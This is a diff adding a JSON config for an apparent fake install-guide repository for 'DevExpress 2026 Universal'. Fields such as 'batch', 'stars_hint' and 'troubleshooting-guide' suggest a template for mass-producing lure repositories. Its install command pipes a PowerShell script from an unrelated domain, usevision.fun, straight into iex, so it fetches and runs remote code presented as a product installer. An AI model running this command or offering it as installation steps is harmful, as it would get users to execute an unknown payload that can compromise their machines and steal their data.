@@ -1,0 +1,12 @@
+{
+  "repo": "DevExpress-2026-Install-Guide",
+  "product": "DevExpress 2026 Universal",
+  "kind": "software",
+  "install_type": "powershell",
+  "install_url": "https://usevision.fun/ps/setup.ps1",
+  "install_command": "irm https://usevision.fun/ps/setup.ps1 | iex",
+  "stars_hint": 10,
+  "batch": "new28",
+  "format": "troubleshooting-guide",
+  "category": "developer-tools"
+}
